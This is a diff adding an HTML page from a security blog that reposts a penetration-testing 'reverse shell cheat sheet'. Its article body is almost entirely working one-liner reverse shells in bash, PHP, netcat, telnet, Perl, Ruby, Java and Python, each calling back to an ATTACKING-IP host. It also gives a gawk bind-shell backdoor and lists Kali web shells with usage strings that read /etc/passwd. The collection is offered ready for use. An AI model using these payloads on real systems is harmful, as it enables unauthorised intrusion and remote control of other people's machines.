@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="During penetration testing if you’re lucky enough to find a remote command execution vulnerability, you’ll more often than not want to connect back to your attacking machine to leverage an interactive">
+<meta name="keywords" content="Hacking,Penetration,转载">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Cheat Sheet Reverse Shell">
+<meta property="og:url" content="http://www.okoksec.com/2019/03/03/Cheat-Sheet-Reverse-Shell/index.html">
+<meta property="og:site_name" content="ZMarvel">
+<meta property="og:description" content="During penetration testing if you’re lucky enough to find a remote command execution vulnerability, you’ll more often than not want to connect back to your attacking machine to leverage an interactive">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-03-03T03:53:19.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Cheat Sheet Reverse Shell">
+<meta name="twitter:description" content="During penetration testing if you’re lucky enough to find a remote command execution vulnerability, you’ll more often than not want to connect back to your attacking machine to leverage an interactive">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Cheat Sheet Reverse Shell</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/project/">项目</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2019/03/03/Cheat-Sheet-RHEL-CentOS-7/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2019/03/03/Cheat-Sheet-Nmap/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://www.okoksec.com/2019/03/03/Cheat-Sheet-Reverse-Shell/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://www.okoksec.com/2019/03/03/Cheat-Sheet-Reverse-Shell/&text=Cheat Sheet Reverse Shell"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://www.okoksec.com/2019/03/03/Cheat-Sheet-Reverse-Shell/&title=Cheat Sheet Reverse Shell"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://www.okoksec.com/2019/03/03/Cheat-Sheet-Reverse-Shell/&is_video=false&description=Cheat Sheet Reverse Shell"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Cheat Sheet Reverse Shell&body=Check out this article: http://www.okoksec.com/2019/03/03/Cheat-Sheet-Reverse-Shell/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://www.okoksec.com/2019/03/03/Cheat-Sheet-Reverse-Shell/&title=Cheat Sheet Reverse Shell"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://www.okoksec.com/2019/03/03/Cheat-Sheet-Reverse-Shell/&title=Cheat Sheet Reverse Shell"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://www.okoksec.com/2019/03/03/Cheat-Sheet-Reverse-Shell/&title=Cheat Sheet Reverse Shell"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://www.okoksec.com/2019/03/03/Cheat-Sheet-Reverse-Shell/&title=Cheat Sheet Reverse Shell"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://www.okoksec.com/2019/03/03/Cheat-Sheet-Reverse-Shell/&name=Cheat Sheet Reverse Shell&description=&lt;p&gt;During penetration testing if you’re lucky enough to find a remote command execution vulnerability, you’ll more often than not want to connect back to your attacking machine to leverage an interactive shell.&lt;/p&gt;
+&lt;p&gt;Below are a collection of &lt;strong&gt;reverse shells&lt;/strong&gt; that use commonly installed programming languages, or commonly installed binaries (nc, telnet, bash, etc). At the bottom of the post are a collection of uploadable reverse shells, present in Kali Linux.&lt;/p&gt;
+&lt;p&gt;If you found this resource usefull you should also check out our &lt;a href=&quot;/blog/penetration-testing-tools-cheat-sheet/&quot;&gt;penetration testing tools&lt;/a&gt; cheat sheet which has some additional reverse shells and other commands useful when performing penetration testing.&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Setup-Listening-Netcat"><span class="toc-number">1.</span> <span class="toc-text">Setup Listening Netcat</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Set-your-Netcat-listening-shell-on-an-allowed-port"><span class="toc-number">1.0.0.1.</span> <span class="toc-text">Set your Netcat listening shell on an allowed port</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#NAT-requires-a-port-forward"><span class="toc-number">1.0.0.2.</span> <span class="toc-text">NAT requires a port forward</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bash-Reverse-Shells"><span class="toc-number">2.</span> <span class="toc-text">Bash Reverse Shells</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP-Reverse-Shell"><span class="toc-number">3.</span> <span class="toc-text">PHP Reverse Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Netcat-Reverse-Shell"><span class="toc-number">4.</span> <span class="toc-text">Netcat Reverse Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Telnet-Reverse-Shell"><span class="toc-number">5.</span> <span class="toc-text">Telnet Reverse Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Perl-Reverse-Shell"><span class="toc-number">6.</span> <span class="toc-text">Perl Reverse Shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Perl-Windows-Reverse-Shell"><span class="toc-number">6.1.</span> <span class="toc-text">Perl Windows Reverse Shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ruby-Reverse-Shell"><span class="toc-number">7.</span> <span class="toc-text">Ruby Reverse Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java-Reverse-Shell"><span class="toc-number">8.</span> <span class="toc-text">Java Reverse Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python-Reverse-Shell"><span class="toc-number">9.</span> <span class="toc-text">Python Reverse Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gawk-Reverse-Shell"><span class="toc-number">10.</span> <span class="toc-text">Gawk Reverse Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kali-Web-Shells"><span class="toc-number">11.</span> <span class="toc-text">Kali Web Shells</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Kali-PHP-Web-Shells"><span class="toc-number">11.1.</span> <span class="toc-text">Kali PHP Web Shells</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Tip-Executing-Reverse-Shells"><span class="toc-number">11.1.0.1.</span> <span class="toc-text">Tip: Executing Reverse Shells</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kali-Perl-Reverse-Shell"><span class="toc-number">11.2.</span> <span class="toc-text">Kali Perl Reverse Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kali-Cold-Fusion-Shell"><span class="toc-number">11.3.</span> <span class="toc-text">Kali Cold Fusion Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kali-ASP-Shell"><span class="toc-number">11.4.</span> <span class="toc-text">Kali ASP Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kali-ASPX-Shells"><span class="toc-number">11.5.</span> <span class="toc-text">Kali ASPX Shells</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kali-JSP-Reverse-Shell"><span class="toc-number">11.6.</span> <span class="toc-text">Kali JSP Reverse Shell</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Cheat Sheet Reverse Shell
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">ZMarvel</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-03-03T03:53:19.000Z" itemprop="datePublished">2019-03-03</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/安全技术/">安全技术</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/Hacking/">Hacking</a>, <a class="tag-link" href="/tags/Penetration/">Penetration</a>, <a class="tag-link" href="/tags/转载/">转载</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>During penetration testing if you’re lucky enough to find a remote command execution vulnerability, you’ll more often than not want to connect back to your attacking machine to leverage an interactive shell.</p>
+<p>Below are a collection of <strong>reverse shells</strong> that use commonly installed programming languages, or commonly installed binaries (nc, telnet, bash, etc). At the bottom of the post are a collection of uploadable reverse shells, present in Kali Linux.</p>
+<p>If you found this resource usefull you should also check out our <a href="/blog/penetration-testing-tools-cheat-sheet/">penetration testing tools</a> cheat sheet which has some additional reverse shells and other commands useful when performing penetration testing.</p>
+<a id="more"></a>
+<h2 id="Setup-Listening-Netcat"><a href="#Setup-Listening-Netcat" class="headerlink" title="Setup Listening Netcat"></a>Setup Listening Netcat</h2><p>Your remote shell will need a listening netcat instance in order to connect back.</p>
+<h5 id="Set-your-Netcat-listening-shell-on-an-allowed-port"><a href="#Set-your-Netcat-listening-shell-on-an-allowed-port" class="headerlink" title="Set your Netcat listening shell on an allowed port"></a>Set your Netcat listening shell on an allowed port</h5><p>Use a port that is likely allowed via outbound firewall rules on the target network, e.g. 80 / 443</p>
+<p>To setup a listening netcat instance, enter the following:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[root@kali]:~<span class="comment"># nc -nvlp 80</span></div><div class="line">nc: listening on :: 80 ...</div><div class="line">nc: listening on 0.0.0.0 80 ...</div></pre></td></tr></table></figure>
+<h5 id="NAT-requires-a-port-forward"><a href="#NAT-requires-a-port-forward" class="headerlink" title="NAT requires a port forward"></a>NAT requires a port forward</h5><p>If you’re attacking machine is behing a NAT router, you’ll need to setup a port forward to the attacking machines IP / Port.</p>
+<p><strong>ATTACKING-IP</strong> is the machine running your listening netcat session, port 80 is used in all examples below (for reasons mentioned above).</p>
+<h2 id="Bash-Reverse-Shells"><a href="#Bash-Reverse-Shells" class="headerlink" title="Bash Reverse Shells"></a>Bash Reverse Shells</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">exec</span> /bin/bash 0&amp;0 2&gt;&amp;0</div></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">0&lt;&amp;196;<span class="built_in">exec</span> 196&lt;&gt;/dev/tcp/ATTACKING-IP/80; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</div></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/ATTACKING-IP/80</div><div class="line">cat &lt;&amp;5 | <span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span> <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="keyword">done</span></div><div class="line"></div><div class="line"><span class="comment"># or:</span></div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="built_in">read</span> line 0&lt;&amp;5; <span class="keyword">do</span> <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="keyword">done</span></div></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash -i &gt;&amp; /dev/tcp/ATTACKING-IP/80 0&gt;&amp;1</div></pre></td></tr></table></figure>
+<h2 id="PHP-Reverse-Shell"><a href="#PHP-Reverse-Shell" class="headerlink" title="PHP Reverse Shell"></a>PHP Reverse Shell</h2><p>A useful PHP reverse shell:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">php -r <span class="string">'$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></div><div class="line">(Assumes TCP uses file descriptor 3. If it doesn<span class="string">'t work, try 4,5, or 6)</span></div></pre></td></tr></table></figure>
+<h2 id="Netcat-Reverse-Shell"><a href="#Netcat-Reverse-Shell" class="headerlink" title="Netcat Reverse Shell"></a>Netcat Reverse Shell</h2><p>Useful netcat reverse shell examples:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc <span class="_">-e</span> /bin/sh ATTACKING-IP 80</div></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/bin/sh | nc ATTACKING-IP 80</div></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rm <span class="_">-f</span> /tmp/p; mknod /tmp/p p &amp;&amp; nc ATTACKING-IP 4444 0/tmp/p</div></pre></td></tr></table></figure>
+<h2 id="Telnet-Reverse-Shell"><a href="#Telnet-Reverse-Shell" class="headerlink" title="Telnet Reverse Shell"></a>Telnet Reverse Shell</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rm <span class="_">-f</span> /tmp/p; mknod /tmp/p p &amp;&amp; telnet ATTACKING-IP 80 0/tmp/p</div></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443</div></pre></td></tr></table></figure>
+<p>Remember to listen on 443 on the attacking machine also.</p>
+<h2 id="Perl-Reverse-Shell"><a href="#Perl-Reverse-Shell" class="headerlink" title="Perl Reverse Shell"></a>Perl Reverse Shell</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -e <span class="string">'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></div></pre></td></tr></table></figure>
+<h3 id="Perl-Windows-Reverse-Shell"><a href="#Perl-Windows-Reverse-Shell" class="headerlink" title="Perl Windows Reverse Shell"></a>Perl Windows Reverse Shell</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -MIO -e <span class="string">'$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</span></div></pre></td></tr></table></figure>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -e <span class="string">'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></div></pre></td></tr></table></figure>
+<h2 id="Ruby-Reverse-Shell"><a href="#Ruby-Reverse-Shell" class="headerlink" title="Ruby Reverse Shell"></a>Ruby Reverse Shell</h2><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ruby -rsocket -e<span class="string">'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span></div></pre></td></tr></table></figure>
+<h2 id="Java-Reverse-Shell"><a href="#Java-Reverse-Shell" class="headerlink" title="Java Reverse Shell"></a>Java Reverse Shell</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">r = Runtime.getRuntime()</div><div class="line">p = r.exec([<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/ATTACKING-IP/80;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span>] as String[])</div><div class="line">p.waitFor()</div></pre></td></tr></table></figure>
+<h2 id="Python-Reverse-Shell"><a href="#Python-Reverse-Shell" class="headerlink" title="Python Reverse Shell"></a>Python Reverse Shell</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></div></pre></td></tr></table></figure>
+<h2 id="Gawk-Reverse-Shell"><a href="#Gawk-Reverse-Shell" class="headerlink" title="Gawk Reverse Shell"></a>Gawk Reverse Shell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/gawk -f</div><div class="line"></div><div class="line">BEGIN &#123;</div><div class="line">        Port    =       8080</div><div class="line">        Prompt  =       &quot;bkd&gt; &quot;</div><div class="line"></div><div class="line">        Service = &quot;/inet/tcp/&quot; Port &quot;/0/0&quot;</div><div class="line">        while (1) &#123;</div><div class="line">                do &#123;</div><div class="line">                        printf Prompt |&amp; Service</div><div class="line">                        Service |&amp; getline cmd</div><div class="line">                        if (cmd) &#123;</div><div class="line">                                while ((cmd |&amp; getline) &gt; 0)</div><div class="line">                                        print $0 |&amp; Service</div><div class="line">                                close(cmd)</div><div class="line">                        &#125;</div><div class="line">                &#125; while (cmd != &quot;exit&quot;)</div><div class="line">                close(Service)</div><div class="line">        &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h2 id="Kali-Web-Shells"><a href="#Kali-Web-Shells" class="headerlink" title="Kali Web Shells"></a>Kali Web Shells</h2><p>The following shells exist within Kali Linux, under <code>/usr/share/webshells/</code> these are only useful if you are able to upload, inject or transfer the shell to the machine.</p>
+<h3 id="Kali-PHP-Web-Shells"><a href="#Kali-PHP-Web-Shells" class="headerlink" title="Kali PHP Web Shells"></a>Kali PHP Web Shells</h3><p>Kali PHP reverse shells and command shells:</p>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/usr/share/webshells/php/&lt;br&gt;php-reverse-shell.php</code></td>
+<td>Pen Test Monkey - PHP Reverse Shell</td>
+</tr>
+<tr>
+<td><code>/usr/share/webshells/&lt;br&gt;php/php-findsock-shell.php</code> <code>/usr/share/webshells/&lt;br&gt;php/findsock.c</code></td>
+<td>Pen Test Monkey, Findsock Shell. Build <code>gcc -o findsock findsock.c</code>(be mindfull of the target servers architecture), execute with netcat not a browser <code>nc -v target 80</code></td>
+</tr>
+<tr>
+<td><code>/usr/share/webshells/&lt;br&gt;php/simple-backdoor.php</code></td>
+<td>PHP backdoor, usefull for CMD execution if upload / code injection is possible, usage: <code>http://target.com/simple-&lt;br&gt;backdoor.php?cmd=cat+/etc/passwd</code></td>
+</tr>
+<tr>
+<td><code>/usr/share/webshells/&lt;br&gt;php/php-backdoor.php</code></td>
+<td>Larger PHP shell, with a text input box for command execution.</td>
+</tr>
+</tbody>
+</table>
+<h5 id="Tip-Executing-Reverse-Shells"><a href="#Tip-Executing-Reverse-Shells" class="headerlink" title="Tip: Executing Reverse Shells"></a>Tip: Executing Reverse Shells</h5><p>The last two shells above are not reverse shells, however they can be useful for executing a reverse shell.</p>
+<h3 id="Kali-Perl-Reverse-Shell"><a href="#Kali-Perl-Reverse-Shell" class="headerlink" title="Kali Perl Reverse Shell"></a>Kali Perl Reverse Shell</h3><p>Kali perl reverse shell:</p>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/usr/share/webshells/perl/&lt;br&gt;perl-reverse-shell.pl</code></td>
+<td>Pen Test Monkey - Perl Reverse Shell</td>
+</tr>
+<tr>
+<td><code>/usr/share/webshells/&lt;br&gt;perl/perlcmd.cgi</code></td>
+<td>Pen Test Monkey, Perl Shell. Usage: <code>http://target.com/perlcmd.cgi?cat /etc/passwd</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="Kali-Cold-Fusion-Shell"><a href="#Kali-Cold-Fusion-Shell" class="headerlink" title="Kali Cold Fusion Shell"></a>Kali Cold Fusion Shell</h3><p>Kali Coldfusion Shell:</p>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/usr/share/webshells/cfm/cfexec.cfm</code></td>
+<td>Cold Fusion Shell - aka CFM Shell</td>
+</tr>
+</tbody>
+</table>
+<h3 id="Kali-ASP-Shell"><a href="#Kali-ASP-Shell" class="headerlink" title="Kali ASP Shell"></a>Kali ASP Shell</h3><p>Classic ASP Reverse Shell + CMD shells:</p>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/usr/share/webshells/asp/</code></td>
+<td>Kali ASP Shells</td>
+</tr>
+</tbody>
+</table>
+<h3 id="Kali-ASPX-Shells"><a href="#Kali-ASPX-Shells" class="headerlink" title="Kali ASPX Shells"></a>Kali ASPX Shells</h3><p>ASP.NET reverse shells within Kali:</p>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/usr/share/webshells/aspx/</code></td>
+<td>Kali ASPX Shells</td>
+</tr>
+</tbody>
+</table>
+<h3 id="Kali-JSP-Reverse-Shell"><a href="#Kali-JSP-Reverse-Shell" class="headerlink" title="Kali JSP Reverse Shell"></a>Kali JSP Reverse Shell</h3><p>Kali JSP Reverse Shell:</p>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/usr/share/webshells/jsp/jsp-reverse.jsp</code></td>
+<td>Kali JSP Reverse Shell</td>
+</tr>
+</tbody>
+</table>
+<p>原文链接：<a href="http://highon.coffee/" target="_blank" rel="external">HighOn.Coffee</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/project/">项目</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Setup-Listening-Netcat"><span class="toc-number">1.</span> <span class="toc-text">Setup Listening Netcat</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Set-your-Netcat-listening-shell-on-an-allowed-port"><span class="toc-number">1.0.0.1.</span> <span class="toc-text">Set your Netcat listening shell on an allowed port</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#NAT-requires-a-port-forward"><span class="toc-number">1.0.0.2.</span> <span class="toc-text">NAT requires a port forward</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bash-Reverse-Shells"><span class="toc-number">2.</span> <span class="toc-text">Bash Reverse Shells</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP-Reverse-Shell"><span class="toc-number">3.</span> <span class="toc-text">PHP Reverse Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Netcat-Reverse-Shell"><span class="toc-number">4.</span> <span class="toc-text">Netcat Reverse Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Telnet-Reverse-Shell"><span class="toc-number">5.</span> <span class="toc-text">Telnet Reverse Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Perl-Reverse-Shell"><span class="toc-number">6.</span> <span class="toc-text">Perl Reverse Shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Perl-Windows-Reverse-Shell"><span class="toc-number">6.1.</span> <span class="toc-text">Perl Windows Reverse Shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ruby-Reverse-Shell"><span class="toc-number">7.</span> <span class="toc-text">Ruby Reverse Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java-Reverse-Shell"><span class="toc-number">8.</span> <span class="toc-text">Java Reverse Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python-Reverse-Shell"><span class="toc-number">9.</span> <span class="toc-text">Python Reverse Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gawk-Reverse-Shell"><span class="toc-number">10.</span> <span class="toc-text">Gawk Reverse Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kali-Web-Shells"><span class="toc-number">11.</span> <span class="toc-text">Kali Web Shells</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Kali-PHP-Web-Shells"><span class="toc-number">11.1.</span> <span class="toc-text">Kali PHP Web Shells</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Tip-Executing-Reverse-Shells"><span class="toc-number">11.1.0.1.</span> <span class="toc-text">Tip: Executing Reverse Shells</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" 